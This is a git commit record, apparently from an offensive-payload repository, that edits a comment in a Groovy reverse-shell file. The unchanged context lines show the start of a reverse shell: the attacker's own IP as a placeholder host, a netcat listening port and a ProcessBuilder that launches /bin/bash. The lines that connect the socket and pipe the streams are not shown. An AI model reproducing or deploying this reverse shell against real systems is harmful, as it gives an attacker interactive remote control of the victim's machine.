0eb783f12a99ca262e6aa25de2e59c4797baa315
Ahmed <ahmedferid0@gmail.com>
2026-01-28 12:59:05 +0100

    Update groovy_ReverseShell.java

--- groovy_ReverseShell.java
+++ groovy_ReverseShell.java
@@ -1,4 +1,4 @@
-String host="IP_ADDRESS";  /* ---> YOUR IP(netcat) */
+String host="IP_ADDRESS";  /* ---> YOUR IP */
 int port=PORT; /* ---> YOUR LISTENING PORT (netcat) */
 String cmd="/bin/bash";
 Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
